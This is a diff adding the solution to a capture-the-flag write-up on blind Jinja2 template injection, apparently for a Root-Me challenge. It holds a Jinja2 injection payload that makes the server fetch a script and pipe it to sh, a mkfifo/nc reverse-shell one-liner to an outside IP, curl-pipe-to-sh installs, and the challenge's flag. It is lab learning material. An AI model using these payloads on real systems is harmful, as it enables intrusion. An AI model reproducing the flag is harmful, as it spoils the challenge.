@@ -2,7 +2,7 @@
 layout: default
 title: Blind-SSTI-Filters-Bypass
 ---
-
+ 
 In this challenge we need to exploit `SSTI` to achieve `RCE`.
 
 As we can see, this is how the data is getting inserted to the template:
@@ -102,6 +102,75 @@ so, surname = `{cycler.__init__.__globals__.os.popen('echo 1337`, email = `| nc 
 
 ![local RCE](./images/Blind-SSTI-Filters-Bypass_local_RCE.png)
 
-I need to send this to the challenge, and get the data, but it doesn't work :| 
+### Edit - keep working :D
 
-**Flag:** ***`PLACE_HOLDER`***
+Nowadays, `ngrok` isn't free any more for tcp, I found this [https://www.reddit.com/r/golang/comments/1rnd78x/i_built_an_opensource_ngrok_alternative_no_signup/](https://www.reddit.com/r/golang/comments/1rnd78x/i_built_an_opensource_ngrok_alternative_no_signup/) tool for http tunneling. I used him because it is very easy for use, and also, the name will be very short.
+Simply install the tool:
+```bash
+curl -fsSL https://wormhole.bar/install.sh | sh
+```
+
+And then execute it:
+```bash
+wormhole http 3000
+```
+
+![[Pasted image 20260309224553.png]]
+
+Now, set up http server for hosting files, on port `3000`:
+```bash
+python3 -m http.server 3000
+```
+
+Since I don't have any free vps, I'm gonna set port forwarding to my ip on the NAT, to port `1337`.
+First, check what is your local IP:
+```ps
+PS C:\Users\avish> ipconfig | findstr "IPv4"
+   IPv4 Address. . . . . . . . . . . : 192.168.41.1
+   IPv4 Address. . . . . . . . . . . : 192.168.137.1
+   IPv4 Address. . . . . . . . . . . : 192.168.33.17
+   IPv4 Address. . . . . . . . . . . : 172.19.16.1
+```
+
+My local IP is `192.168.33.17`, since the IP of the router in the LAN is `192.168.33.1`. 
+Let's access the web console of my local router, to set the port forwarding, simply go to `http://192.168.33.17` (your ip router of course)
+
+![[Pasted image 20260309225050.png]]
+
+Adjust it as needed with your local router, just google it. Now, we can check what is our real IP out there in the worlds, using websites like [https://whatismyipaddress.com/](https://whatismyipaddress.com/). In our case, the IP seems to be `164.138.117.211`.
+![[Pasted image 20260309225416.png]]
+
+So, last steps will be to set up local listener (this is powershell, that's why ncat.exe):
+```ps
+ncat.exe -nvlp 1337
+```
+
+Create the file `a.sh` with the payload of the reverse shell taken from [https://www.revshells.com/](https://www.revshells.com/).
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 164.138.117.211 1337 >/tmp/f
+```
+
+The file should be served via the python http server.
+Lastly, the payload of the request will be:
+```json
+name={&surname={cycler.__init__.__globals__.os.popen('curl+&email=https://1le7s1.wormhole.bar/a.sh|sh').read()}&bday=}
+```
+
+We are ready to send the payload!
+
+We got the revesre shell!
+![[Pasted image 20260309225542.png]]
+
+I searched for the `flag.txt` file:
+```bash
+web-serveur-ch73@challenge01:~$ find . -name "flag.txt" 2>/dev/null
+./9f/35/cc/c7/95/80/59/46/ac/79/10/3d/aa/flag.txt
+```
+
+Okay, let's read it:
+```bash
+web-serveur-ch73@challenge01:~$ cat ./9f/35/cc/c7/95/80/59/46/ac/79/10/3d/aa/flag.txt
+j1nj4_s3rv3r_S1de_T3mpl4te_1j3ct10ns_1n_pyth0n
+```
+
+**Flag:** ***`j1nj4_s3rv3r_S1de_T3mpl4te_1j3ct10ns_1n_pyth0n`***
